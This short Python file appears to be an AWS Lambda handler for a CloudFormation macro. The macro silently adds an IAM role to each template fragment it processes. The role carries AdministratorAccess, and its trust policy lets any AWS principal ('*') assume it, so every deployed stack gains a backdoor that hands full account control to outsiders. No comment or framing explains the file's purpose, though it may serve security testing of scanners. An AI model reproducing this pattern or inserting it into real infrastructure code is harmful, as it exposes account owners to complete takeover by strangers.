import random


def handler(event, context):
    fragment = add_role(event["fragment"])

    return {"requestId": event["requestId"], "status": "success", "fragment": fragment}


def add_role(fragment):
    role = {}
    role["Type"] = "AWS::IAM::Role"
    role["Properties"] = {
        "AssumeRolePolicyDocument": {
            "Statement": [
                {"Action": "sts:AssumeRole", "Effect": "Allow", "Principal": {"AWS": "*"}}
            ],
            "Version": "2012-10-17",
        },
        "ManagedPolicyArns": [
            {
                "Fn::Join": [
                    "",
                    ["arn:", {"Ref": "AWS::Partition"}, ":iam::aws:policy/AdministratorAccess"],
                ]
            }
        ],
        "RoleName": f"role-{str(random.randrange(0,1000))}",
    }
    fragment["Role"] = role
    return fragment
